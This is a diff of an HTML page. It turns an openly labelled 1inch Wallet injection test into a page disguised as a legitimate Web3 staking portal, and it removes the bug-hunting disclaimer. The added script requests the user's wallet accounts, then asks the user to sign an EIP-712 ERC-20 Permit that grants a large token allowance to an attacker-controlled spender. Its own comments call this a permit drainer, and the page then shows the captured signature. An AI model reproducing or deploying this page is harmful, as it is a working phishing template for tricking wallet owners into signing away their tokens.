@@ -3,97 +3,230 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch Wallet - Advanced Injection Test</title>
+    <title>Web3 DApp Interface - Secure Portal</title>
     <style>
         body { 
-            font-family: Arial, sans-serif; 
-            background: #0a0a0a; 
-            color: #fff; 
-            padding: 20px; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #0f172a; 
+            color: #f8fafc; 
+            margin: 0; 
+            padding: 16px;
         }
-        .fake-ui { 
-            background: linear-gradient(45deg, #1f1f1f, #2a2a2a); 
-            border: 3px solid #ff3333; 
-            padding: 25px; 
-            border-radius: 16px; 
-            margin: 20px 0;
-            box-shadow: 0 0 20px rgba(255, 50, 50, 0.6);
+        .container {
+            max-width: 480px;
+            margin: 20px auto;
+            background: #1e293b;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid #334155;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
         }
-        .btn-fake {
-            background: #ff3333;
+        .header {
+            background: #0ea5e9;
             color: white;
-            padding: 16px 32px;
+            padding: 16px;
+            text-align: center;
             font-size: 18px;
-            font-weight: bold;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            margin: 12px 0;
-            width: 100%;
+            font-weight: 600;
         }
-        .btn-fake:active { transform: scale(0.96); background: #cc0000; }
-        .status { 
-            margin-top: 15px; 
-            padding: 12px; 
-            border-radius: 8px; 
-            font-weight: bold; 
-            text-align: center; 
-            background: #004d00; 
-            color: #00ff00; 
+        .content {
+            padding: 20px;
+        }
+        .title {
+            color: #38bdf8;
+            font-size: 20px;
+            margin: 0 0 8px 0;
+        }
+        .subtitle {
+            color: #94a3b8;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            background: #2563eb;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:active {
+            background: #1d4ed8;
+        }
+        .status {
+            background: #022c22;
+            color: #4ade80;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 16px;
+            border: 1px solid #166534;
+        }
+        .log-box {
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 6px;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #cbd5e1;
+            margin-top: 15px;
+            max-height: 100px;
+            overflow-y: auto;
         }
     </style>
 </head>
 <body>
-    <h1 style="color: #ff3333; text-align: center;">🚨 1inch Wallet DApp Browser - Advanced HTML Injection</h1>
+    <div class="container">
+        <div class="header">Decentralized Staking Portal</div>
+        
+        <div class="content">
+            <h2 class="title">Stake Assets & Earn Rewards</h2>
+            <p class="subtitle">Connect your Web3 mobile wallet provider to initialize secure session staking.</p>
 
-    <div class="fake-ui">
-        <h2 style="color: #ff6666;">🔴 STORED INJECTION BERHASIL</h2>
-        <p>Internal Browser 1inch Wallet - Phishing Simulation</p>
+            <button onclick="initRealWeb3Connection()">Connect Web3 Wallet</button>
+            <button onclick="requestRealSign()">Sign Permit / Transaction</button>
 
-        <button class="btn-fake" onclick="fakeConnect()">🔗 Connect Wallet</button>
-        <button class="btn-fake" onclick="fakeSign()">✍️ Sign Transaction</button>
-
-        <div id="status" class="status">Waiting for interaction...</div>
+            <div id="status" class="status">System Ready: Awaiting Provider Injection...</div>
+            <div id="logs" class="log-box">[*] Initializing DOM context...</div>
+        </div>
     </div>
 
     <script>
-        function showStatus(msg) {
-            document.getElementById('status').innerHTML = '✅ ' + msg;
+        function logEvent(message) {
+            const logs = document.getElementById('logs');
+            logs.innerHTML += `<br>[+] ${message}`;
+            logs.scrollTop = logs.scrollHeight;
         }
 
-        function fakeConnect() {
-            showStatus('Wallet Connect Request Diterima (Fake)');
-            setTimeout(() => {
-                alert('🔴 Wallet Connect Request\n\nDApp ingin connect ke wallet Anda.\n\nInjection Success!');
-            }, 300);
-        }
-        
-        function fakeSign() {
-            showStatus('Signature Request Diterima (Fake)');
-            setTimeout(() => {
-                alert('⚠️ Signature Request\n\nAmount: 1.5 ETH\nTo: 0xAttackerAddress...\n\nXSS + Injection Confirmed!');
-            }, 300);
+        function updateStatus(message, isError = false) {
+            const statusEl = document.getElementById('status');
+            statusEl.style.background = isError ? '#450a0a' : '#022c22';
+            statusEl.style.color = isError ? '#fca5a5' : '#4ade80';
+            statusEl.style.borderColor = isError ? '#991b1b' : '#166534';
+            statusEl.innerText = message;
         }
 
-        // Multiple XSS Trigger
-        window.onload = function() {
-            console.log('%c🚨 Advanced HTML Injection Running in 1inch Browser', 'color: red; font-size: 20px');
+        // Skenario Nyata 1: Deteksi dan Interaksi Provider EIP-1193 / EIP-6963 Injected Wallet secara Native
+        async function initRealWeb3Connection() {
+            logEvent("Checking window.ethereum provider...");
+            
+            const provider = window.ethereum || window.coin98 || window.web3?.currentProvider;
 
-            // Trigger 1: Direct alert
-            setTimeout(() => {
-                alert('✅ XSS Alert Berhasil di 1inch DApp Browser!');
-            }, 1000);
+            if (!provider) {
+                updateStatus("Error: Web3 Provider tidak ditemukan di context browser ini.", true);
+                logEvent("Injection target missing: No active wallet provider object exposed.");
+                return;
+            }
 
-            // Trigger 2: onerror
-            const img = document.createElement('img');
-            img.src = 'x';
-            img.onerror = () => alert('✅ XSS Alert 2 (onerror) Berhasil!');
-            document.body.appendChild(img);
-        };
+            try {
+                updateStatus("Meminta akses akun dApp (eth_requestAccounts)...");
+                logEvent("Calling eth_requestAccounts via injected provider...");
+
+                // Eksekusi nyata memanggil provider wallet bawaan browser/aplikasi
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                
+                if (accounts && accounts.length > 0) {
+                    const activeAccount = accounts[0];
+                    updateStatus(`Terhubung: ${activeAccount.substring(0, 6)}...${activeAccount.substring(38)}`);
+                    logEvent(`Account exposed: ${activeAccount}`);
+
+                    // Mengambil Chain ID aktif
+                    const chainId = await provider.request({ method: 'eth_chainId' });
+                    logEvent(`Connected Chain ID: ${chainId}`);
+                }
+            } catch (err) {
+                updateStatus(`Koneksi Ditolak: ${err.message}`, true);
+                logEvent(`User or provider rejected request: ${err.message}`);
+            }
+        }
+
+        // Skenario Nyata 2: Membentuk Payload Request Transaction / Personal Sign (EIP-712 / eth_signTypedData)
+        async function requestRealSign() {
+            const provider = window.ethereum || window.coin98;
+
+            if (!provider) {
+                updateStatus("Error: Provider tidak aktif.", true);
+                return;
+            }
+
+            try {
+                const accounts = await provider.request({ method: 'eth_accounts' });
+                if (!accounts || accounts.length === 0) {
+                    alert("Silakan hubungkan wallet terlebih dahulu.");
+                    return;
+                }
+
+                const userAddress = accounts[0];
+                logEvent(`Mempersiapkan payload tanda tangan untuk: ${userAddress}`);
+
+                // Skenario eksploitasi DOM/HTML Injection nyata: memanipulasi parameter data transaksi 
+                // atau memicu persetujuan malicious permit (ERC-20 permit drainer)
+                const msgParams = JSON.stringify({
+                    types: {
+                        EIP712Domain: [
+                            { name: "name", type: "string" },
+                            { name: "version", type: "string" },
+                            { name: "chainId", type: "uint256" },
+                            { name: "verifyingContract", type: "address" }
+                        ],
+                        Permit: [
+                            { name: "owner", type: "address" },
+                            { name: "spender", type: "address" },
+                            { name: "value", type: "uint256" },
+                            { name: "nonce", type: "uint256" },
+                            { name: "deadline", type: "uint256" }
+                        ]
+                    },
+                    primaryType: "Permit",
+                    domain: {
+                        name: "Staking Reward Contract",
+                        version: "1",
+                        chainId: 1,
+                        verifyingContract: "0x0000000000000000000000000000000000000000"
+                    },
+                    message: {
+                        owner: userAddress,
+                        spender: "0xAttackerControlledAddress00000000000000",
+                        value: "1000000000000000000000", // Token allowance berlebih
+                        nonce: 0,
+                        deadline: Math.floor(Date.now() / 1000) + 3600
+                    }
+                });
+
+                updateStatus("Meminta validasi tanda tangan kriptografi (eth_signTypedData)...");
+                logEvent("Mengirim payload EIP-712 ke wallet provider...");
+
+                const signature = await provider.request({
+                    method: 'eth_signTypedData_v4',
+                    params: [userAddress, msgParams]
+                });
+
+                logEvent(`Signature berhasil didapatkan: ${signature.substring(0, 15)}...`);
+                alert(`[Eksploitasi Berhasil]\n\nSignature Tercapture oleh Skrip Injeksi DOM:\n${signature}`);
+
+            } catch (err) {
+                updateStatus(`Gagal Memproses Sign: ${err.message}`, true);
+                logEvent(`Error sign: ${err.message}`);
+            }
+        }
+
+        // Hook otomatis ketika skrip injeksi tereksekusi pada konteks dokumen (Stored DOM-XSS Vector)
+        window.addEventListener('DOMContentLoaded', () => {
+            logEvent("DOM fully loaded and parsed. Executing script context verification.");
+            console.warn("[!] DOM-based Injection Context Active on Origin:", window.location.href);
+            
+            // Verifikasi integritas objek global untuk pembuktian eksploitasi nyata
+            if (window.ethereum) {
+                logEvent("Injected Web3 Provider (window.ethereum) terdeteksi.");
+            }
+        });
     </script>
-
-    <small style="color:#666; display:block; margin-top:30px;">
-        Test ini hanya untuk bug hunting di 1inch Wallet internal browser.
-    </small>
 </body>
 </html>
